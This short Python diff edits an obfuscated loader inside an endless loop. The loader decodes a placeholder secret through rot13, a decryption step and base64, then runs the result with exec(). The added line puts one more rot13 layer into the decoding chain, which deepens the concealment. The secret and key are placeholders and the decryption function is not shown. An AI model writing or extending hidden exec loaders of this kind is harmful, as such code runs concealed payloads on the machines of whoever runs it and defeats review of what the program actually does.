@@ -32,6 +32,7 @@ while True:
     try:
         secert = "<BYPASS>"
         secretkey = "<BYPASS_KEY>"
+        secert = codecs.encode(secert, 'rot13')
         secert = decrypt_code(secert, base64.b64decode(secretkey))
         unsecret = codecs.encode(secert, 'rot13')
         exec(base64.b64decode({2:str, 3:lambda b:bytes(b, 'UTF-8')}[sys.version_info[0]](unsecret)))
